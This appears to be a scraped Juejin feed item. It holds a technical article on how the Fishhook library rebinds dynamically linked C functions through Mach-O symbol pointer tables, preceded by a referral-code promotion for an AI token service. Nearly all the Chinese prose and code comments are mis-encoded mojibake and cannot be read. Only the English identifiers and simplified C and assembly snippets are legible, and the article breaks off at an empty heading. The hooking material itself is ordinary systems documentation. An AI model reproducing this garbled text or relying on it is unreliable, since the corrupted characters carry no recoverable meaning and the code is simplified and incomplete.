<p>æƒ³é¢†ç™½å«–ç¦åˆ©çš„ç‚¹è¿™é‡Œï¼š æ³¨å†Œæ—¶å¡«æˆ‘çš„é‚€è¯·ç ï¼šNQ6oï¼Œç›´æ¥é€ 3500000 Tokensã€‚åˆ«ç­‰äº†ï¼Œèµ¶ç´§å»é¢†ä½ çš„ä¸“å±ç‰›é©¬å§ï¼</p>
<p>ç‚¹å‡»é“¾æ¥å¸¦ä½ çš„æ•°å­—å°ç‰›é©¬å›å®¶å§ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aipyaipy.com%2F" target="_blank" title="https://www.aipyaipy.com/" ref="nofollow noopener noreferrer">www.aipyaipy.com/</a><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aipyaipy.com%2F" target="_blank" title="https://www.aipyaipy.com/" ref="nofollow noopener noreferrer">AiPy</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[FishhookåŸç†æ·±åº¦å‰–æï¼šä»Mach-Oåˆ°è¿è¡Œæ—¶å‡½æ•°Hook]]></title>    <link>https://juejin.cn/post/7596975035438792713</link>    <guid>https://juejin.cn/post/7596975035438792713</guid>    <pubDate>2026-01-20T04:07:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596975035438792713" data-draft-id="7596890557545971758" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="FishhookåŸç†æ·±åº¦å‰–æï¼šä»Mach-Oåˆ°è¿è¡Œæ—¶å‡½æ•°Hook"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-20T04:07:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sweetä¸¶"/> <meta itemprop="url" content="https://juejin.cn/user/3227821869921646"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            FishhookåŸç†æ·±åº¦å‰–æï¼šä»Mach-Oåˆ°è¿è¡Œæ—¶å‡½æ•°Hook
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821869921646/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sweetä¸¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T04:07:52.000Z" title="Tue Jan 20 2026 04:07:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    26
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨iOS/macOSå¼€å‘ä¸­ï¼Œå‡½æ•°Hookæ˜¯ä¸€é¡¹å¼ºå¤§çš„æŠ€æœ¯ï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨è¿è¡Œæ—¶ä¿®æ”¹å‡½æ•°è¡Œä¸ºï¼Œå¹¿æ³›åº”ç”¨äºè°ƒè¯•ã€ç›‘æ§ã€æ€§èƒ½åˆ†æç­‰é¢†åŸŸã€‚Fishhookä½œä¸ºFacebookå¼€æºçš„ä¸€ä¸ªè½»é‡çº§Hookæ¡†æ¶ï¼Œå…¶è®¾è®¡ç²¾å·§ã€å®ç°ç®€æ´ï¼Œæ˜¯ç†è§£macOS/iOSç³»ç»ŸåŠ¨æ€é“¾æ¥æœºåˆ¶çš„ç»ä½³æ¡ˆä¾‹ã€‚æœ¬æ–‡å°†æ·±å…¥å‰–æFishhookçš„å·¥ä½œåŸç†ï¼Œè§£ç­”ä¸€ç³»åˆ—æ ¸å¿ƒé—®é¢˜ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€Fishhookæ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>Fishhookæ˜¯ä¸€ä¸ªåŸºäºåŠ¨æ€é“¾æ¥ç‰¹æ€§çš„å‡½æ•°Hookåº“ï¼Œä¸“é—¨é’ˆå¯¹macOSå’ŒiOSå¹³å°è®¾è®¡ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯é€šè¿‡ä¿®æ”¹Mach-Oæ–‡ä»¶ä¸­çš„ç¬¦å·ç»‘å®šè¡¨æ¥å®ç°Cå‡½æ•°çš„Hookã€‚</p>
<p><strong>æ ¸å¿ƒç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>è½»é‡çº§ï¼Œä»…å‡ ç™¾è¡Œä»£ç </li>
<li>ä¸“æ³¨äºCå‡½æ•°Hook</li>
<li>åŸºäºåˆæ³•çš„dyld API</li>
<li>ä¸»è¦ç”¨äºè°ƒè¯•å’Œç›‘æ§åœºæ™¯</li>
</ul>
<h2 data-id="heading-2">äºŒã€æ ¸å¿ƒé—®é¢˜ï¼šFishhookä¸ºä»€ä¹ˆåªèƒ½HookåŠ¨æ€é“¾æ¥å‡½æ•°ï¼Ÿ</h2>
<h3 data-id="heading-3">1. Mach-Oæ–‡ä»¶ç»“æ„å›é¡¾</h3>
<p>è¦ç†è§£Fishhookçš„é™åˆ¶ï¼Œé¦–å…ˆè¦äº†è§£Mach-Oæ–‡ä»¶ç»“æ„ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">Mach-O Header
Load Commands
<span class="hljs-bullet">    -</span> LC<span class="hljs-emphasis">_SEGMENT_</span>64
<span class="hljs-bullet">    -</span> LC<span class="hljs-emphasis">_SYMTAB (ç¬¦å·è¡¨)
    - LC_</span>DYSYMTAB (åŠ¨æ€ç¬¦å·è¡¨)
<span class="hljs-bullet">    -</span> LC<span class="hljs-emphasis">_DYLD_</span>INFO (ç»‘å®šä¿¡æ¯)
Data
<span class="hljs-bullet">    -</span> <span class="hljs-strong">__TEXT (ä»£ç æ®µï¼Œåªè¯»)
    - __</span>DATA (æ•°æ®æ®µï¼Œå¯å†™)
<span class="hljs-bullet">        -</span> <span class="hljs-strong">__la<span class="hljs-emphasis">_symbol_</span>ptr (æƒ°æ€§ç»‘å®šæŒ‡é’ˆ)
        - __</span>nl<span class="hljs-emphasis">_symbol_</span>ptr (éæƒ°æ€§ç»‘å®šæŒ‡é’ˆ)
<span class="hljs-bullet">        -</span> <span class="hljs-strong">__got (å…¨å±€åç§»è¡¨)
    - __</span>LINKEDIT (é“¾æ¥ä¿¡æ¯)
</code></pre>
<h3 data-id="heading-4">2. åŠ¨æ€é“¾æ¥ vs é™æ€é“¾æ¥</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// é™æ€é“¾æ¥å‡½æ•°ï¼ˆæ— æ³•Hookï¼‰</span>
<span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">internal_function</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ç¼–è¯‘æ—¶ç›´æ¥åµŒå…¥äºŒè¿›åˆ¶</span>
    <span class="hljs-comment">// è°ƒç”¨æ–¹å¼ï¼šcall 0x100000f00 (ç›´æ¥åœ°å€)</span>
}

<span class="hljs-comment">// åŠ¨æ€é“¾æ¥å‡½æ•°ï¼ˆå¯ä»¥Hookï¼‰</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span> {
    <span class="hljs-comment">// æ¥è‡ªlibSystem.dylib</span>
    <span class="hljs-comment">// è°ƒç”¨æ–¹å¼ï¼šcall [__la_symbol_ptr + offset] (é—´æ¥å¯»å€)</span>
}
</code></pre>
<p><strong>å…³é”®åŒºåˆ«ï¼š</strong> åŠ¨æ€é“¾æ¥å‡½æ•°é€šè¿‡ç¬¦å·æŒ‡é’ˆè¡¨é—´æ¥è°ƒç”¨ï¼ŒFishhookæ­£æ˜¯é€šè¿‡ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆè¡¨ä¸­çš„åœ°å€æ¥å®ç°Hookã€‚</p>
<h3 data-id="heading-5">3. ä¸ºä»€ä¹ˆåªèƒ½Hookç³»ç»Ÿåº“å‡½æ•°ï¼Ÿ</h3>
<p>è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„è¯¯è§£ï¼<strong>Fishhookä¸ä»…å¯ä»¥Hookç³»ç»Ÿåº“å‡½æ•°ï¼Œä¹Ÿå¯ä»¥Hookè‡ªå®šä¹‰åŠ¨æ€åº“å‡½æ•°ã€‚</strong></p>
<pre><code class="hljs language-objective-c" lang="objective-c">// è‡ªå®šä¹‰åŠ¨æ€åº“ä¸­çš„å‡½æ•°ä¹Ÿå¯ä»¥Hook
__attribute__((visibility("default")))
void my_dynamic_function() {
    // è¿™ä¸ªå‡½æ•°å¯ä»¥è¢«Fishhook Hook
}

// åªè¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š
// 1. å‡½æ•°æ¥è‡ªåŠ¨æ€åº“ï¼ˆä¸æ˜¯é™æ€é“¾æ¥ï¼‰
// 2. å‡½æ•°å…·æœ‰å¤–éƒ¨å¯è§æ€§ï¼ˆä¸æ˜¯staticï¼‰
// 3. å‡½æ•°é€šè¿‡ç¬¦å·è¡¨å¼•ç”¨
</code></pre>
<h2 data-id="heading-6">ä¸‰ã€ç¬¦å·ç»‘å®šæœºåˆ¶æ·±åº¦è§£æ</h2>
<h3 data-id="heading-7">1. æƒ°æ€§ç»‘å®šï¼ˆLazy Bindingï¼‰ vs éæƒ°æ€§ç»‘å®š</h3>
<h4 data-id="heading-8"><strong>æƒ°æ€§ç»‘å®šï¼ˆ__la_symbol_ptrï¼‰</strong></h4>
<pre><code class="hljs language-assembly" lang="assembly">; ç¬¬ä¸€æ¬¡è°ƒç”¨printfæ—¶çš„æµç¨‹
call printf    ; å®é™…è°ƒç”¨æ¡©ä»£ç 

; __stubsä¸­çš„æ¡©ä»£ç 
___stub_printf:
    jmp *___la_symbol_ptr[0]   ; ç¬¬ä¸€æ¬¡è·³è½¬åˆ°dyld_stub_binder

; ç»‘å®šåçš„çŠ¶æ€
___la_symbol_ptr[0] = 0x7fff12345678 (çœŸå®printfåœ°å€)
</code></pre>
<h4 data-id="heading-9"><strong>éæƒ°æ€§ç»‘å®šï¼ˆ__nl_symbol_ptrï¼‰</strong></h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ç¨‹åºå¯åŠ¨æ—¶ç«‹å³ç»‘å®šçš„å‡½æ•°</span>
<span class="hljs-comment">// ç°ä»£iOS/macOSä¸­ï¼Œ__nl_symbol_ptrå·²è¾ƒå°‘ä½¿ç”¨</span>
<span class="hljs-comment">// å–è€Œä»£ä¹‹çš„æ˜¯__gotï¼ˆå…¨å±€åç§»è¡¨ï¼‰</span>

<span class="hljs-comment">// ä½¿ç”¨__gotçš„ç¤ºä¾‹</span>
<span class="hljs-type">void</span> *function_ptr __attribute__((section(<span class="hljs-string">"__DATA,__got"</span>))) = &amp;some_function;
</code></pre>
<h4 data-id="heading-10"><strong>ç°ä»£ç»‘å®šæœºåˆ¶å˜åŒ–</strong></h4>
<p>åœ¨ç°ä»£ iOS/macOS ä¸­ï¼Œä¼ ç»Ÿçš„ <code>__nl_symbol_ptr / __la_symbol_ptr</code> çš„è§’è‰²å·²è¢«å¼±åŒ–ï¼Œ
ç¼–è¯‘å™¨å’Œ dyld æ›´å¤šé€šè¿‡<code> GOT-like</code> çš„é—´æ¥å¯»å€æ–¹å¼ä»¥åŠ <code>chained fixups</code> æœºåˆ¶æ¥å®Œæˆç¬¦å·ç»‘å®šï¼›å› æ­¤ä½¿ç”¨æ—¶éœ€è¦æ³¨æ„æ˜¯å¦èƒ½æ­£ç¡®å®ç°hook.</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ä¼ ç»Ÿæ–¹å¼çš„ç¼ºç‚¹</span>
<span class="hljs-comment"># 1. é‡å®šä½è¡¨å¯èƒ½å¾ˆå¤§</span>
<span class="hljs-comment"># 2. åŠ è½½æ—¶éœ€è¦å¤§é‡éšæœºå†…å­˜è®¿é—®</span>
<span class="hljs-comment"># 3. ä¸æ”¯æŒæ–°ç¡¬ä»¶ç‰¹æ€§</span>
<span class="hljs-comment"># 4. å®‰å…¨ä¿æŠ¤æœ‰é™</span>

<span class="hljs-comment"># Chained Fixups çš„ä¼˜åŠ¿</span>
<span class="hljs-comment"># 1. æ›´å°çš„äºŒè¿›åˆ¶å¤§å°ï¼ˆå‡å°‘30-50%é‡å®šä½æ•°æ®ï¼‰</span>
<span class="hljs-comment"># 2. æ›´å¿«çš„å¯åŠ¨é€Ÿåº¦</span>
<span class="hljs-comment"># 3. æ”¯æŒæŒ‡é’ˆè®¤è¯ï¼ˆPACï¼‰</span>
<span class="hljs-comment"># 4. æ›´å¥½çš„å®‰å…¨æ€§å’Œæ€§èƒ½</span>

// å¯»å€æ–¹å¼å¯¹æ¯”
<span class="hljs-comment">; ä¼ ç»Ÿæ–¹å¼ï¼ˆx86_64ï¼‰</span>
<span class="hljs-comment">; é€šè¿‡ __la_symbol_ptr è°ƒç”¨ printf</span>
lea     rdi, <span class="hljs-section">[rip + format_string]</span>
call    qword ptr <span class="hljs-section">[rip + ___la_symbol_ptr_printf]</span>

<span class="hljs-comment">; __la_symbol_ptr èŠ‚åŒºå†…å®¹ï¼š</span>
___la_symbol_ptr_printf:
    .quad   ___dyld_stub_binder_printf

<span class="hljs-comment">; ç°ä»£æ–¹å¼ï¼ˆarm64ï¼‰</span>
<span class="hljs-comment">; é€šè¿‡ GOT-like é—´æ¥å¯»å€</span>
adrp    x0, _printf@GOTPAGE     <span class="hljs-comment">; è·å– GOT é¡µ</span>
ldr     x1, <span class="hljs-section">[x0, _printf@GOTPAGEOFF]</span> <span class="hljs-comment">; ä» GOT åŠ è½½åœ°å€</span>
blr     x1                      <span class="hljs-comment">; é—´æ¥è·³è½¬</span>

<span class="hljs-comment">; å®é™…ä¸Šï¼Œç¼–è¯‘å™¨å¯èƒ½ç”Ÿæˆæ›´ä¼˜åŒ–çš„ä»£ç </span>
<span class="hljs-comment">; ç›´æ¥ä½¿ç”¨ PC ç›¸å¯¹å¯»å€ï¼Œä¸éœ€è¦æ˜¾å¼çš„ GOT èŠ‚åŒº</span>
</code></pre>
<h3 data-id="heading-11">2. dyld_stub_binderçš„å·¥ä½œåŸç†</h3>
<p>å½“ç¬¬ä¸€æ¬¡è°ƒç”¨åŠ¨æ€é“¾æ¥å‡½æ•°æ—¶ï¼Œç³»ç»Ÿå¦‚ä½•æŸ¥æ‰¾çœŸå®åœ°å€ï¼Ÿ</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// dyld_stub_binderçš„ç®€åŒ–æµç¨‹</span>
<span class="hljs-type">void</span>* <span class="hljs-title function_">dyld_stub_binder</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> lazy_binding_info_offset)</span> {
    <span class="hljs-comment">// 1. ä»__LINKEDITè·å–ç»‘å®šä¿¡æ¯</span>
    LazyBindingInfo *info = get_binding_info(offset);
    
    <span class="hljs-comment">// 2. æå–ç¬¦å·åå’Œåº“åºå·</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *symbol_name = info-&gt;symbol_name;
    <span class="hljs-type">int</span> library_ordinal = info-&gt;library_ordinal;
    
    <span class="hljs-comment">// 3. åœ¨æŒ‡å®šåŠ¨æ€åº“ä¸­æŸ¥æ‰¾ç¬¦å·</span>
    <span class="hljs-type">void</span> *address = find_symbol(symbol_name, library_ordinal);
    
    <span class="hljs-comment">// 4. ä¿®æ”¹ç¬¦å·æŒ‡é’ˆè¡¨</span>
    <span class="hljs-type">void</span> **symbol_ptr = info-&gt;symbol_pointer;
    *symbol_ptr = address;  <span class="hljs-comment">// å…³é”®æ­¥éª¤ï¼</span>
    
    <span class="hljs-comment">// 5. è·³è½¬åˆ°ç›®æ ‡å‡½æ•°</span>
    <span class="hljs-keyword">return</span> address;
}
</code></pre>
<h3 data-id="heading-12">3. ASLRï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰çš„å½±å“</h3>
<p>ASLRæ˜¯ç°ä»£æ“ä½œç³»ç»Ÿçš„å®‰å…¨ç‰¹æ€§ï¼Œæ¯æ¬¡å¯åŠ¨æ—¶ç³»ç»Ÿæ¨¡å—çš„åŠ è½½åœ°å€éƒ½éšæœºå˜åŒ–ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// æ²¡æœ‰ASLRï¼š</span>
<span class="hljs-comment">// printfåœ°å€å›ºå®šä¸º0x7fff12345678</span>

<span class="hljs-comment">// æœ‰ASLRï¼š</span>
<span class="hljs-comment">// ç¬¬ä¸€æ¬¡å¯åŠ¨ï¼šprintfåœ°å€ä¸º0x7fff12345678</span>
<span class="hljs-comment">// ç¬¬äºŒæ¬¡å¯åŠ¨ï¼šprintfåœ°å€ä¸º0x7fff56789abc</span>
<span class="hljs-comment">// ç¬¬ä¸‰æ¬¡å¯åŠ¨ï¼šprintfåœ°å€ä¸º0x7fff9abcdef0</span>

<span class="hljs-comment">// Mach-Oé€šè¿‡ä½ç½®æ— å…³ä»£ç æ”¯æŒASLRï¼š</span>
<span class="hljs-comment">// æ‰€æœ‰å¤–éƒ¨å¼•ç”¨éƒ½é€šè¿‡æŒ‡é’ˆè¡¨é—´æ¥è®¿é—®</span>
<span class="hljs-comment">// æŒ‡é’ˆè¡¨åœ°å€åœ¨è¿è¡Œæ—¶ç”±dyldå¡«å……</span>
</code></pre>
<h2 data-id="heading-13">å››ã€Fishhookçš„æ ¸å¿ƒå®ç°åŸç†</h2>
<h3 data-id="heading-14">1. æ ¸å¿ƒæ•°æ®ç»“æ„ï¼šrebinding</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rebinding</span> {</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;      <span class="hljs-comment">// è¦Hookçš„å‡½æ•°å</span>
    <span class="hljs-type">void</span> *replacement;     <span class="hljs-comment">// æ›¿æ¢å‡½æ•°çš„åœ°å€</span>
    <span class="hljs-type">void</span> **replaced;       <span class="hljs-comment">// ä¿å­˜åŸå§‹å‡½æ•°æŒ‡é’ˆ</span>
};
</code></pre>
<h3 data-id="heading-15">2. Fishhookçš„å·¥ä½œæµç¨‹</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">int</span> <span class="hljs-title function_">rebind_symbols</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> rebinding rebindings[], <span class="hljs-type">size_t</span> rebindings_nel)</span> {
    <span class="hljs-comment">// 1. éå†æ‰€æœ‰é•œåƒï¼ˆåŠ¨æ€åº“ï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; _dyld_image_count(); i++) {
        <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mach_header</span> *<span class="hljs-title">header</span> =</span> _dyld_get_image_header(i);
        
        <span class="hljs-comment">// 2. æŸ¥æ‰¾__DATAæ®µä¸­çš„ç¬¦å·æŒ‡é’ˆè¡¨</span>
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">segment_command</span> *<span class="hljs-title">seg</span> =</span> find_segment(header, <span class="hljs-string">"__DATA"</span>);
        <span class="hljs-keyword">if</span> (!seg) <span class="hljs-keyword">continue</span>;
        
        <span class="hljs-comment">// 3. æŸ¥æ‰¾__la_symbol_ptrå’Œ__gotèŠ‚</span>
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">section</span> *<span class="hljs-title">la_section</span> =</span> find_section(seg, <span class="hljs-string">"__la_symbol_ptr"</span>);
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">section</span> *<span class="hljs-title">got_section</span> =</span> find_section(seg, <span class="hljs-string">"__got"</span>);
        
        <span class="hljs-comment">// 4. å¤„ç†æ¯ä¸ªç¬¦å·æŒ‡é’ˆ</span>
        perform_rebinding_with_section(la_section, rebindings, rebindings_nel);
        perform_rebinding_with_section(got_section, rebindings, rebindings_nel);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-16">3. å…³é”®å‡½æ•°ï¼šæŸ¥æ‰¾å’Œæ›¿æ¢ç¬¦å·</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">perform_rebinding_with_section</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> section *section,
                                          <span class="hljs-keyword">struct</span> rebinding rebindings[],
                                          <span class="hljs-type">size_t</span> rebindings_nel)</span> {
    <span class="hljs-comment">// 1. è·å–é—´æ¥ç¬¦å·è¡¨</span>
    <span class="hljs-type">uint32_t</span> *indirect_symbol_indices = indirect_symbol_table + section-&gt;reserved1;
    
    <span class="hljs-comment">// 2. éå†ç¬¦å·æŒ‡é’ˆè¡¨ä¸­çš„æ¯ä¸ªæ¡ç›®</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; section-&gt;size / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*); i++) {
        <span class="hljs-type">uint32_t</span> symtab_index = indirect_symbol_indices[i];
        
        <span class="hljs-comment">// 3. åœ¨åŠ¨æ€ç¬¦å·è¡¨ä¸­æŸ¥æ‰¾ç¬¦å·ä¿¡æ¯</span>
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nlist_64</span> *<span class="hljs-title">symbol</span> =</span> &amp;symtab[symtab_index];
        <span class="hljs-type">uint32_t</span> strtab_offset = symbol-&gt;n_un.n_strx;
        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *symbol_name = strtab + strtab_offset;
        
        <span class="hljs-comment">// 4. æ£€æŸ¥æ˜¯å¦æ˜¯éœ€è¦Hookçš„å‡½æ•°</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; rebindings_nel; j++) {
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(symbol_name, rebindings[j].name) == <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// 5. æ‰¾åˆ°ç›®æ ‡ï¼è¿›è¡ŒHook</span>
                <span class="hljs-type">void</span> **symbol_ptr = (<span class="hljs-type">void</span>**)(section-&gt;addr + i * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*));
                
                <span class="hljs-comment">// ä¿å­˜åŸå§‹å‡½æ•°æŒ‡é’ˆ</span>
                <span class="hljs-keyword">if</span> (rebindings[j].replaced != <span class="hljs-literal">NULL</span>) {
                    *rebindings[j].replaced = *symbol_ptr;
                }
                
                <span class="hljs-comment">// æ›¿æ¢ä¸ºæ–°çš„å‡½æ•°åœ°å€</span>
                *symbol_ptr = rebindings[j].replacement;
                
                <span class="hljs-keyword">break</span>;
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-17">äº”ã€å®é™…åº”ç”¨åœºæ™¯å’Œé™åˆ¶</h2>
<h3 data-id="heading-18">1. æ”¯æŒçš„å‡½æ•°ç±»å‹</h3>



































